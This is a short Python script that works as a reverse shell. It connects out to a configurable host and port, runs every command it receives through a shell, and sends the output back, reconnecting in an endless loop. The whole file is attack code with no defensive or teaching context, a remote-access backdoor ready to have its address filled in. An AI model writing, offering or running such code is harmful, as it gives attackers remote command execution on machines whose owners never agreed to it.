import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.1.1"  # Change this
port = 3334  # Change this


def xyz():
    s.connect((host, port))
    while True:
        raw_data = s.recv(8192)
        data = raw_data.decode("ascii")

        if data == "exit":
            s.close()
        else:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            stdout_value = proc.stdout.read() + proc.stderr.read()
            s.send(stdout_value)


while True:
    xyz()
